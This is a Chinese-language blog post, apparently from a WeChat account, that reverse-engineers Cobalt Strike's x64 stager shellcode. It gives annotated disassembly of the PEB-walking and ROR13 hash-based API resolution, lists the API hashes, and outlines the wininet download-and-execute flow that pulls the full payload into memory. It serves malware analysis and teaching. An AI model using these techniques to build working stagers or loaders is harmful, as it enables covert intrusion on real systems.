#  深入剖析Cobalt Strike小马拉大马原理

原创 ohohYeah [ 云原生与安全 ](javascript:void\(0\);)

**云原生与安全** ![]()

微信号 gh_8d95ab154c68

功能介绍 输出个人学习技术笔记，主要方向云原生和安全，包括容器docker、容器编排kubernetes、eBPF、golang开发、网络安全。

____

___发表于_

> 本文对CS生成的stage类型的shellocde进行分析，最后附上带有注释的ida反汇编源码
>
>
> 先说结论：CS生成的stage马的执行流程简单来说就是普通的win编程，先`LoadLibrary('wininet.dll')`，然后就是正常的访问网络数据请求，也就是open一个网络句柄，然后connect这个句柄，然后open一个request，然后发送这个request，virtualAlloc申请，并用`InternetReadFile`读取网络数据到内存里然后执行这么一个流程。只不过并不是直接调用这些api，而是通过遍历内存中加载的dll以及对应dll导出表来获取这些api的地址进行调用的。而这些dll又是通过获取teb再获取peb一步一步索引到的。根据这个流程其实可以直接用C写一个stage马。

公众号回复`CS原理`获取详细注释版的源码

shellcode在`cld`和操作`rsp`之后，call了`sub_D2`，此函数前半部分代码如下，做了准备参数的工作然后通过call回到调用此函数的下一条函数地址去了。

    
    
    sub_D2 proc far                         ; CODE XREF: seg000:0000000000000005↑p  
    pop     rbp               ;call压栈的返回地址pop给rbp  
    push    0                 ;压栈0  
    mov     r14, 'teniniw'	;wininet  
    push    r14               ;压栈'teniniw'  
    mov     r14, rsp  
    mov     rcx, r14          ;rcx=rsp，相当于传参  
    mov     r10d, 726774Ch    ;r10d=726774Ch，相当于传参  
    call    rbp               ;jmp到call的下一条指令

> 补充：
>
> x64函数调用规则vc函数传参为rcx,rdx,r8,r9

接着shellcode中有如下代码

    
    
    xor     rdx, rdx  
    mov     rdx, gs:[rdx+60h]  
    mov     rdx, [rdx+18h]  
    mov     rdx, [rdx+20h]  
      
    loc_21:                                 ; CODE XREF: seg000:00000000000000CD↓j  
    mov     rsi, [rdx+50h]  
    movzx   rcx, word ptr [rdx+4Ah]

> 预备知识：
>
>   * GS段寄存器在用户态指向TEB(Thread Environment Block，线程环境块)
>
>   *
> 进程中每个线程都对应一个TEB结构体，而TEB中又存储着PEB地址。通过遍历PEB可以获取kernell32和ntdll的基址，进而可以调用系统api。
>
>

windbg中查看`_TEB`结构，gs:[60h]就是`_PEB`

windbg中查看`_PEB`，偏移0x18处是Ldr

如下图，`_PEB_LDR_DATA(Ldr)`偏移0x20是`InMemoryOrderModuleList : _LIST_ENTRY`，

> 注意：
>
>
> 这里取到的地址是指向了`_LDR_DATA_TABLE_ENTRY`结构体中的`InMemoryOrderLinks`成员变量的地址，而不是`_LDR_DATA_TABLE_ENTRY`结构体的地址。稍后会详细说明

在`_PEB_LDR_DATA`中包含三个`_LIST_ENTRY`

    
    
    InLoadOrderModuleList:	模块加载顺序  
    InMemoryOrderModuleList:	模块在内存中的顺序  
    InInitializationOrderModuleList:	模块初始化装载顺序

`_LIST_ENTRY`结构体定义如下

    
    
    typedef struct _LIST_ENTRY {  
       struct _LIST_ENTRY *Flink;  
       struct _LIST_ENTRY *Blink;  
    } LIST_ENTRY, *PLIST_ENTRY, *RESTRICTED_POINTER PRLIST_ENTRY;

`_LIST_ENTRY`这个双链表指向进程装载的模块，结构中的每个指针指向了一个`_LDR_DATA_TABLE_ENTRY`的结构。

> 说明：
>
>
> 为啥`_LIST_ENTRY`结构体里是两个`_LIST_ENTRY`类型指针，却指向了`_LDR_DATA_TABLE_ENTRY`结构呢，这就是操作系统设计时的一个细节，双向链表头都是用的这个结构。又因为指针类型占用字节空间大小一样，所以完全兼容。

> 预备知识：
>
> PEB.Ldr中的三个值,`Ldr.InLoadOrderModuleList`,
> `Ldr.InMemoryOrderModuleList`，`Ldr.InInitializationOrderModuleList`并不是直接指向`_LDR_DATA_TABLE_ENTRY`结构体首地址。而是一个对应的关系。
>
>
> 即`Ldr.InLoadOrderModuleList`指向`_LDR_DATA_TABLE_ENTRY.InLoadOrderLinks`；`Ldr.InMemoryOrderModuleList`指向`_LDR_DATA_TABLE_ENTRY.InMemoryOrderLinks`
>
> windbg中`!peb`查看ped地址，根据这个地址转成_PEB_LDR_DATA `dt _PEB_LDR_DATA
> 0x00007fffc853c4c0`，在根据`_PEB_LDR_DATA
> `结构体中的InLoadOrderModuleList地址查看`_LDR_DATA_TABLE_ENTRY`,`dt
> _LDR_DATA_TABLE_ENTRY 0x0000021ec41c3390`可以证实。

查看`_LDR_DATA_TABLE_ENTRY`结构

`_LDR_DATA_TABLE_ENTRY.InMemoryOrderLinks`偏移50h就指向了BaseDllName这个`_UNICODE_STRING`结构体

查看`_UNICODE_STRING`，0x48+0x8=0x50，也就是指向了`Buffer`，这里存储的就是Dll名，可以通过这个名字确定当前遍历到的dll是不是自己想要的。再借助`_LIST_ENTRY`就可以遍历这整个由`_LIST_ENTRY`
组织起来的双向循环链表了。

接下来代码就是将dll名字放到rsi，长度`MaximumLength`放到rcx

    
    
    loc_21:                                 ; CODE XREF: seg000:00000000000000CD↓j  
    mov     rsi, [rdx+50h]  
    movzx   rcx, word ptr [rdx+4Ah]

然后将dll名小写字母转换成大写字母，并操作了r9d寄存器，rcx为0时退出loop

    
    
    loc_2D:                                 ; CODE XREF: seg000:000000000000003E↓j  
    xor     rax, rax  
    lodsb  
    cmp     al, 61h ; 'a'  
    jl      short loc_37  
      
    sub     al, 20h ; ' '  
    loc_37:                                 ; CODE XREF: seg000:0000000000000033↑j  
    ror     r9d, 0Dh  
    add     r9d, eax  
    loop    loc_2D

然后遍历dll，并对每个dll遍历导出函数，来找给定hash值的函数api的地址，找到的话就调用了

    
    
    push    rdx   ;InMemoryOrderModuleList，指向_LDR_DATA_TABLE_ENTRY.InMemoryOrderLinks  
    push    r9  
    mov     rdx, [rdx+20h]    ;rdx = DllBase，即dos头在内存的位置  
    mov     eax, [rdx+3Ch]    ;eax = PE头相对于文件的偏移地址  
    add     rax, rdx  ;rax = PE头在内存的地址  
    cmp     word ptr [rax+18h], 20Bh  ;pe扩展头，0x20B表示64位可执行文件  
    jnz     short loc_C7  ;判断是否是64位可执行文件  
      
    mov     eax, [rax+88h]    ;eax = 导出地址表  
    test    rax, rax      ;一般dll有导出表，而exe没有，这里是查看此文件是否为dll  
    jz      short loc_C7  
      
    add     rax, rdx  ;rax = 导出表在内存中的地址  
    push    rax  
    mov     ecx, [rax+18h]    ;ecx = NumberOfNames  
    mov     r8d, [rax+20h]    ;r8d = AddressOfNames  
    add     r8, rdx   ;r8 = AddressOfNames在内存中的地址  
      
    loc_6E:                                 ; CODE XREF: seg000:0000000000000094↓j  
    jrcxz   loc_C6    ;rcx=0时跳转到loc_C6  
      
    dec     rcx  
    mov     esi, [r8+rcx*4]   ;esi = 导出函数字符串的地址  
    add     rsi, rdx  ;dll名在内存中的地址  
    xor     r9, r9  
      
      
    loc_7D:                ;求hash计算                 ; CODE XREF: seg000:000000000000008A↓j  
    xor     rax, rax  
    lodsb         ;al = rsi  
    ror     r9d, 0Dh  
    add     r9d, eax  
    cmp     al, ah  
    jnz     short loc_7D  
      
    add     r9, [rsp+8]  
    cmp     r9d, r10d     ;当前api字符串的hash和给定的r10d是否一样  
    jnz     short loc_6E  ;不一样就接着遍历下一个导出的函数  
      
    pop     rax   ;rax = 导出表在内存中的地址  
    mov     r8d, [rax+24h]    ;r8d = AddressOfNameOrdinals(导出函数序号表RVA)  
    add     r8, rdx   ;r8d = AddressOfNameOrdinals(导出函数序号表RVA)在内存的地址  
    mov     cx, [r8+rcx*2]    ;cx = 函数序号  
    mov     r8d, [rax+1Ch]    ;r8d = AddressOfFunctions(导出函数地址表RVA)  
    add     r8, rdx   ;r8d = AddressOfFunctions在内存的地址  
    mov     eax, [r8+rcx*4]   ;eax=api地址  
    add     rax, rdx  ;eax = api在内存中的地址  
    pop     r8  
    pop     r8  
    pop     rsi  
    pop     rcx  
    pop     rdx  
    pop     r8  
    pop     r9  
    pop     r10  
    sub     rsp, 20h  
    push    r10   ;相当于call前的返回地址  
    jmp     rax   ;布置参数，调用api，此时rax就是要调用的api的地址  
      
    ; ---------------------------------------------------------------------------  
      
    loc_C6:                                 ; CODE XREF: seg000:loc_6E↑j  
    pop     rax  
      
      
    loc_C7:                                 ; CODE XREF: seg000:0000000000000053↑j  
    ; seg000:000000000000005E↑j  
    pop     r9      
    pop     rdx   ;InMemoryOrderModuleList，指向_LDR_DATA_TABLE_ENTRY.InMemoryOrderLinks  
    mov     rdx, [rdx]    ;InMemoryOrderLinks->Flink，即遍历dll  
    jmp     loc_21

> 补充：
>
>   * pe文件的dos头
>
>

>  
>  
>     typedef struct _IMAGE_DOS_HEADER {  
>     >       WORD e_magic; //MZ标志位(也叫魔数)，例如0x4D5A表示是一个MS-DOS下的可执行文件  
>     >       WORD e_cblp;  //文件最后一页的字节数  
>     >       WORD e_cp;    //文件的页数  
>     >       WORD e_crlc;  //DOS Stub中重定位项的个数  
>     >       WORD e_cparhdr;   //区段(也叫节)中头部大小  
>     >       WORD e_minalloc;  //最小附加内存要求  
>     >       WORD e_maxalloc;  //最大附加内存要求  
>     >       WORD e_ss;    //初始化SS寄存器  
>     >       WORD e_sp;    //初始化SP寄存器  
>     >       WORD e_csum;  //校验和  
>     >       WORD e_ip;    //初始化IP寄存器  
>     >       WORD e_cs;    //初始化CS寄存器  
>     >       WORD e_lfarlc;    //重定位表的偏移，其实就是指向DOS Stub的偏移  
>     >       WORD e_ovno;  //附加的数量  
>     >       WORD e_res[4];    //保留他用  
>     >       WORD e_oemid; //oem相关信息(oem:原始设备制造商)  
>     >       WORD e_oeminfo;   //oem相关信息  
>     >       WORD e_res2[10];  //保留他用  
>     >       LONG e_lfanew;    //一般指向pe文件头 +003ch  
>     > } IMAGE_DOS_HEADER,*PIMAGE_DOS_HEADER;
>
>   * pe文件的pe头
>
>

>  
>  
>     typedef struct _IMAGE_NT_HEADERS64 {  
>     >       DWORD Signature;  //PE标识  
>     >       IMAGE_FILE_HEADER FileHeader; //文件头  
>     >       IMAGE_OPTIONAL_HEADER64 OptionalHeader;   //扩展头 +0018h  
>     > } IMAGE_NT_HEADERS64,*PIMAGE_NT_HEADERS64;
>
>   * IMAGE_OPTIONAL_HEADER64结构体
>
>

>  
>  
>     typedef struct _IMAGE_OPTIONAL_HEADER64 {  
>     >   WORD                 Magic;  
>     >   BYTE                 MajorLinkerVersion;  
>     >   BYTE                 MinorLinkerVersion;  
>     >   DWORD                SizeOfCode;  
>     >   DWORD                SizeOfInitializedData;  
>     >   DWORD                SizeOfUninitializedData;  
>     >   DWORD                AddressOfEntryPoint;  
>     >   DWORD                BaseOfCode;  
>     >   ULONGLONG            ImageBase;  
>     >   DWORD                SectionAlignment;  
>     >   DWORD                FileAlignment;  
>     >   WORD                 MajorOperatingSystemVersion;  
>     >   WORD                 MinorOperatingSystemVersion;  
>     >   WORD                 MajorImageVersion;  
>     >   WORD                 MinorImageVersion;  
>     >   WORD                 MajorSubsystemVersion;  
>     >   WORD                 MinorSubsystemVersion;  
>     >   DWORD                Win32VersionValue;  
>     >   DWORD                SizeOfImage;  
>     >   DWORD                SizeOfHeaders;  
>     >   DWORD                CheckSum;  
>     >   WORD                 Subsystem;  
>     >   WORD                 DllCharacteristics;  
>     >   ULONGLONG            SizeOfStackReserve;  
>     >   ULONGLONG            SizeOfStackCommit;  
>     >   ULONGLONG            SizeOfHeapReserve;  
>     >   ULONGLONG            SizeOfHeapCommit;  
>     >   DWORD                LoaderFlags;  
>     >   DWORD                NumberOfRvaAndSizes;  
>     >   IMAGE_DATA_DIRECTORY
> DataDirectory[IMAGE_NUMBEROF_DIRECTORY_ENTRIES];  
>     > } IMAGE_OPTIONAL_HEADER64, *PIMAGE_OPTIONAL_HEADER64;
>
>   * 导出表结构体
>
>

>  
>  
>     typedef struct _IMAGE_EXPORT_DIRECTORY {  
>     >     DWORD   Characteristics;    //未使用  
>     >     DWORD   TimeDateStamp;      //时间戳  
>     >     WORD    MajorVersion;       //未使用  
>     >     WORD    MinorVersion;       //未使用  
>     >     DWORD   Name;               //指向改导出表文件名字符串  
>     >     DWORD   Base;               //导出表的起始序号  
>     >     DWORD   NumberOfFunctions;
> //导出函数的个数(更准确来说是AddressOfFunctions的元素数，而不是函数个数)  
>     >     DWORD   NumberOfNames;      //以函数名字导出的函数个数  
>     >     DWORD   AddressOfFunctions;
> //导出函数地址表RVA:存储所有导出函数地址(表元素宽度为4，总大小NumberOfFunctions * 4)  
>     >     DWORD   AddressOfNames;
> //导出函数名称表RVA:存储函数名字符串所在的地址(表元素宽度为4，总大小为NumberOfNames * 4)  
>     >     DWORD   AddressOfNameOrdinals;
> //导出函数序号表RVA:存储函数序号(表元素宽度为2，总大小为NumberOfNames * 2)  
>     > } IMAGE_EXPORT_DIRECTORY, *PIMAGE_EXPORT_DIRECTORY;

最复杂的部分就上面这块遍历dll和其导出的api了，其中主要涉及到一个求函数hash的算法，没太看明白，但是x64dbg动调的过程中都能恢复出来

    
    
    0x0726774C——LoadLibraryA  
    0xA779563A——InternetOpenA  
    0xC69F8957——InternetConnectA  
    0x3B2E55EB—–HttpOpenRequestA  
    0x7B18062D—–HttpSendRequestA  
    0xE553A458—–VirtualAlloc  
    0xE2899612—–InternetReadFile

下图就是对LoadLibraryA这个api求出hash后和r10d进行比较的截图

总结一下stage马调用的api的流程如下

1.`LoadLibraryA`加载`wininet.dll`

2.`InternetOpenA`=>`InternetConnectA`=>`HttpOpenRequestA`=>`HttpSendRequestA`

3.`VirtualAlloc`

4.`InternetReadFile`读入完整shellcode

  

预览时标签不可点

微信扫一扫  
关注该公众号

继续滑动看下一个

# 深入剖析Cobalt Strike小马拉大马原理

原创 ohohYeah [ 云原生与安全 ](javascript:void\(0\);)

轻触阅读原文

![]()

云原生与安全

向上滑动看下一个

[知道了](javascript:;)

微信扫一扫  
使用小程序

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

： ， 。   视频 小程序 赞 ，轻点两下取消赞 在看 ，轻点两下取消在看 分享 留言

